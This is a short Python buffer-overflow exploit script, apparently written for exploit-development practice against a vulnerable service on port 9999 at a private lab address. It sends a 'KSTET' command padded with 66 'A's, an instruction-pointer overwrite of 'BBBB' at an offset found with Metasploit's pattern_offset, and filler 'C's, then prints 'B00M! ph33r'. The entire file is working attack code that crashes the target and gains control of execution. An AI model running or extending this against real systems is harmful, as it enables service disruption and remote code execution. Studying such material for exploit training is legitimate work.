#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from sys import exit

rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)

# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 41326341
# [*] Exact match at offset 66
expected_payload_len = 1000 + 10  # 10 for the KSTET /.:/
payload = "KSTET /.:/"
payload += "A" * 66
payload += "BBBB"
payload += "C" * 930

if len(payload) != expected_payload_len:
    print('[!] Payload length is {x}, expected {y}'.format(x=len(payload), y=expected_payload_len))
    exit(1)

if __name__ == '__main__':
    print('[*] connecting to remote host')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect(target)
        print('[*] receiving the welcome message')
        welcome = s.recv(1024)
        print('[*] received the following message:\n\t{msg}'.format(msg=welcome))
        s.send(payload)
        print('[*] B00M! ph33r')
    except timeout:
        print('[!] Timed out waiting for the server. Is it paused in the debugger?')
    except error:
        print('[!] A socket error occurred. Is the server running')
